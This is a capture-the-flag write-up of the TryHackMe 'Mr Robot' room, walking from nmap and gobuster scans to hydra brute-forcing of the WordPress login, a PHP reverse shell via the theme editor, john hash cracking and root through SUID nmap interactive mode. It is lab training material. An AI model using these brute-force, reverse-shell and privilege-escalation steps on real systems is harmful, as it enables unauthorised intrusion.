---
title: Box - Mr Robot CTF
published: true
---

Based on the Mr. Robot show, can you root this box?

[https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)

![0xskar](/assets/mrrobot01.jpg)

* * *

## Hack the Machine

##   Nmap Scans

- Discover open ports with ``nmap -Pn -sS -T5 10.10.122.32 -p- -vvv``
- We find ports 22,80,443
- Port 22/tcp  closed ssh      reset ttl 61

> Port 80/tcp  open   http     syn-ack ttl 61 Apache httpd
> http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
> http-title: Site doesn't have a title (text/html).
> http-methods: 
> Supported Methods: GET HEAD POST OPTIONS
> http-server-header: Apache

##  What is key 1?

- ``gobuster dir -u http://10.10.122.32/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x txt,html,php -t 100``
- Robots.txt

##  What is key 2?

- ``/wp-login.php`` we can brute force using the fsocity.dic found in robots.txt
- using foxyproxy and burpsuite we can capture what we need to generate our hydra code
- ``hydra -L fsocity.dic -p password 10.10.122.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"``
- We find username Elliot
- ``hydra -l Elliot -P fsocity.dic 10.10.122.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The Password you entered for the username"``
- eventually you will get the password ``ER28-0652``
- open up netcat listener and change the theme to php reverse shell
- upgrade shell ``python -c 'import pty; pty.spawn("/bin/bash")'``

![0xskar](/assets/mrrobot02.png)

- John the ripper the raw-md5 hash in robot dir in order to su to robot ``john password.raw-md5 --wordlist=fsocity.dic --format=Raw-MD5``

![0xskar](/assets/mrrobot03.png)

##   Linpeas.sh - PrivESC Vectors

- **SUID** - /usr/local/bin/nmap - [GTFO BINS](https://gtfobins.github.io/gtfobins/nmap/#suid)

- ``nmap --interactive``

```shell
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
!whoami
root
waiting to reap child : No child processes
nmap> !sh
!sh
# whoami
whoami
root
```

##  What is key 3?

![0xskar](/assets/mrrobot04.png)

* * * 